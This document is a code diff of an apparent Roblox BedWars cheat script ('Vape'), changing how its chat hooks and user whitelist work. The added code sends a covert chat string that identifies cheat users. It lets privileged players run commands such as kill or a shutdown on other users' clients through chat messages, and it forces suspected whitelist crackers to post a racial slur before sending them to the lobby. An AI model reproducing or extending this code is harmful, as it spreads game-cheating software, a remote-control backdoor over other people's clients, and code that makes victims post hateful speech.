@@ -84,6 +84,8 @@ local isnetworkowner = function(part)
 	return networkownerswitch <= tick()
 end
 local getcustomasset = getsynasset or getcustomasset or function(location) return "rbxasset://"..location end
+local sendmessage = function() end
+local sendprivatemessage = function() end
 local queueonteleport = syn and syn.queue_on_teleport or queue_on_teleport or function() end
 local synapsev3 = syn and syn.toast_notification and "V3" or ""
 local worldtoscreenpoint = function(pos)
@@ -1132,6 +1134,29 @@ GuiLibrary.LoadSettingsEvent.Event:Connect(function(res)
 	end
 end)
 
+sendmessage = function(text)
+	if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(text)
+	else
+		replicatedStorageService.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, 'All')
+	end
+end
+
+sendprivatemessage = function(player, text)
+	if player then
+		if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+			local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
+			local whisperchannel = game:GetService('RobloxReplicatedStorage').ExperienceChat.WhisperChat:InvokeServer(player.UserId)
+			if whisperchannel then
+				whisperchannel:SendAsync(text)
+				textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
+			end
+		else
+			replicatedStorageService.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('/w '..player.Name.." "..text, 'All')
+		end
+	end
+end
+
 runFunction(function()
 	local function getWhitelistedBed(bed)
 		if bed then
@@ -1511,18 +1536,32 @@ runFunction(function()
 		return oldZephyrUpdate(self, orb, ...)
 	end
 
-	task.spawn(function()
+    task.spawn(function()
 		repeat task.wait() until WhitelistFunctions.Loaded
 		for i, v in pairs(WhitelistFunctions.WhitelistTable.WhitelistedUsers) do
 			if v.tags then
 				for i2, v2 in pairs(v.tags) do
 					v2.color = Color3.fromRGB(unpack(v2.color))
 				end
-			end
-		end
-
-		local alreadysaidlist = {}
-
+		    end
+	    end
+    end)
+        
+	runFunction(function()
+	    local function vpwhitelistcheck(plr)
+		    repeat task.wait() until WhitelistFunctions.Loaded 
+		    if WhitelistFunctions:GetWhitelist(plr) > 0 then 
+			    if WhitelistFunctions:GetWhitelist(lplr) == 0 then
+			        sendmessage('helloimusinginhaler') 
+			    end 
+                if WhitelistFunctions:GetWhitelist(plr) == 1 then 
+			        WhitelistFunctions:CreatePlayerTag(plr, 'VAPE PRIVATE', '5D3FD3')
+                elseif WhitelistFunctions:GetWhitelist(plr) == 2 then
+                    WhitelistFunctions:CreatePlayerTag(plr, 'VAPE OWNER', '5D3FD3')
+                end
+		    end 
+	    end
+        local alreadysaidlist = {}
 		local function findplayers(arg, plr)
 			local temp = {}
 			local continuechecking = true
@@ -1534,7 +1573,7 @@ runFunction(function()
 
 			return temp
 		end
-
+                
 		local function transformImage(img, txt)
 			local function funnyfunc(v)
 				if v:GetFullName():find("ExperienceChat") == nil then
@@ -1588,7 +1627,7 @@ runFunction(function()
 			end
 			game.DescendantAdded:Connect(funnyfunc)
 		end
-
+                
 		local vapePrivateCommands = {
 			kill = function(args, plr)
 				if entityLibrary.isAlive then
@@ -1913,86 +1952,28 @@ runFunction(function()
 				game:Shutdown()
 			end
 		}
-
-		textChatService.OnIncomingMessage = function(message) 
-			local properties = Instance.new('TextChatMessageProperties')
-			local player = playersService:GetPlayerByUserId(message.TextSource.User.Id)
-			if message.TextSource then 
-				local vapetag = (player and WhitelistFunctions.playerTags[player])
-				if vapetag and WhitelistFunctions.LocalPriority > 0 then 
-					properties.PrefixText = "<font color='#"..vapetag.Color.."'>["..vapetag.Text.."] </font> " ..message.PrefixText or message.PrefixText
-				end
-        		end
-			return properties
-					
-			if player == lplr then		
-				if WhitelistFunctions.LocalPriority > 0 then
-					if message.Text:len() >= 5 and message.Text:sub(1, 5):lower() == ";cmds" then
-						local tab = {}
-						for i,v in pairs(vapePrivateCommands) do
-							table.insert(tab, i)
-						end
-						table.sort(tab)
-						local str = ""
-						for i,v in pairs(tab) do
-							str = str..";"..v.."\n"
-						end
-						if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then 
-                    					textChatService.ChatInputBarConfiguration.TargetTextChannel:DisplaySystemMessage(str)
-                				else 
-                    					game:GetService('StarterGui'):SetCore('ChatMakeSystemMessage', {Text = str,  Color = Color3.fromRGB(255, 255, 255), Font = Enum.Font.SourceSansBold, FontSize = Enum.FontSize.Size24})
-                				end
-					end
-				else
-					WhitelistFunctions:CreateUserTag(lplr)
-					message.Text = ""
-					alreadysaidlist[plr.Name] = true
-					warningNotification("Vape", plr.Name.." is using "..client.."!", 60)
-					WhitelistFunctions.playerTags[plr.Name] = string.format("[%s] ", client:upper()..' USER')
-					bedwarsStore.whitelist.clientUsers[plr.Name] = client:upper()..' USER'
-					local ind, newent = entityLibrary.getEntityFromPlayer(plr)
-					if newent then entityLibrary.entityUpdatedEvent:Fire(newent) end
-				end
-			end
-					
-		if replicatedStorageService:FindFirstChild('DefaultChatSystemChatEvents') then 
-			local chatTables = {}
-			local oldchatfunc
-			for i,v in next, getconnections(replicatedStorageService.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent) do 
-			if v.Function and #debug.getupvalues(v.Function) > 0 and type(debug.getupvalues(v.Function)[1]) == 'table' then
-				local chatvalues = getmetatable(debug.getupvalues(v.Function)[1]) 
-				if chatvalues and chatvalues.GetChannel then  
-					oldchatfunc = chatvalues.GetChannel 
-					chatvalues.GetChannel = function(self, name) 
-						local data = oldchatfunc(self, name) 
-						local addmessage = (data and data.AddMessageToChannel)
-						if data and data.AddMessageToChannel then 
-							if chatTables[data] == nil then 
-								chatTables[data] = data.AddMessageToChannel 
-							end 
-						data.AddMessageToChannel = function(self2, data2)
-							local plr = playersService:FindFirstChild(data2.FromSpeaker)
-							local vapetag = (plr and WhitelistFunctions.CustomTags[plr])
-							if data2.FromSpeaker and vapetag and vapeInjected then 
-								local tagcolor = Color3.fromHex(vapetag.Color)
-								data2.ExtraData = {
-									Tags = {unpack(data2.ExtraData.Tags), {TagText = vapetag.Text, TagColor = tagcolor}},
-									NameColor = plr.Team == nil and Color3.fromRGB(tagcolor.R + 45, tagcolor.G + 45, tagcolor.B - 10) or plr.TeamColor.Color
-								}																																																																																																																																																																			
-								end
-							return addmessage(self2, data2)
-							end
-							return data
-						end
-					end
-				end
-			end
-		end
-	end
-		
-	end
-
 		vapePrivateCommands.unfreeze = vapePrivateCommands.thaw
+        for i,v in next, playersService:GetPlayers() do 
+		    task.spawn(vpwhitelistcheck, v)
+	    end
+
+	    table.insert(vapeConnections, playersService.PlayerAdded:Connect(vpwhitelistcheck))
+	    table.insert(vapeConnections, vapeStore.MessageReceived.Event:Connect(function(plr, message)
+		    message = message:gsub('/w ', '')
+            if plr ~= lplr and message:find('helloimusinginhaler') and WhitelistFunctions:GetWhitelist(lplr) > 0 and WhitelistFunctions:GetWhitelist(plr) == 0 then 
+			    warningNotification('Vape', plr.DisplayName..' is using vape client!', 60)
+                WhitelistFunctions.CustomTags[plr.Name] = string.format("[%s] ", client:upper()..' USER')
+				bedwarsStore.whitelist.clientUsers[plr.Name] = client:upper()..' USER'
+                local ind, newent = entityLibrary.getEntityFromPlayer(plr)
+				if newent then entityLibrary.entityUpdatedEvent:Fire(newent) end
+		    end
+            
+		    for i,v in next, vapePrivateCommands do 
+			    if plr ~= lplr and message:find(';'..i) and WhitelistFunctions:GetWhitelist(plr) > WhitelistFunctions:GetWhitelist(lplr) then 
+				    v(message:split(' '), plr)
+			    end
+		    end
+	    end))
 
 		local function newPlayer(plr)
 			if WhitelistFunctions:GetWhitelist(plr) ~= 0 and WhitelistFunctions.LocalPriority == 0 then
@@ -2000,28 +1981,18 @@ runFunction(function()
 					warningNotification("Vape", "nice one bro :troll:", 5)
 				end
 				task.spawn(function()
-					repeat task.wait() until plr:GetAttribute("LobbyConnected")
-					task.wait(4)
-                                        local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
-					local newchannel = game:GetService("RobloxReplicatedStorage").ExperienceChat.WhisperChat:InvokeServer(plr.UserId)
-					local client = bedwarsStore.whitelist.chatStrings2.vape
-					task.spawn(function()
-						game:GetService("CoreGui").ExperienceChat.bubbleChat.DescendantAdded:Connect(function(newbubble)
-							if newbubble:IsA("TextLabel") and newbubble.Text:find(client) then
-								newbubble.Parent.Parent.Visible = false
-							end
-						end)
-						game:GetService("CoreGui").ExperienceChat:FindFirstChild("RCTScrollContentView", true).ChildAdded:Connect(function(newbubble)
-							if newbubble:IsA("TextLabel") and newbubble.Text:find(client) then
-								newbubble.Visible = false
-							end
-						end)
-					end)
+					task.wait(0.1)
+					local newchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
 					if newchannel then 
-						newchannel:SendAsync(client)
+						newchannel:SendAsync("I tried to crack the whitelist but I'm a skid")
+                        wait(3)
+                        newchannel:SendAsync("I am a")
+                        wait(3)
+                        newchannel:SendAsync("negar")
 					end
-					textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
 				end)
+                wait(3)
+                bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()                  
 			end
 		end
 
@@ -11879,3 +11850,4 @@ Keystrokes = GuiLibrary.ObjectsThatCanBeSaved.VelocityWindow.Api.CreateOptionsBu
     end,
     ["HoverText"] = "RGB Keystrokes"
 })
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
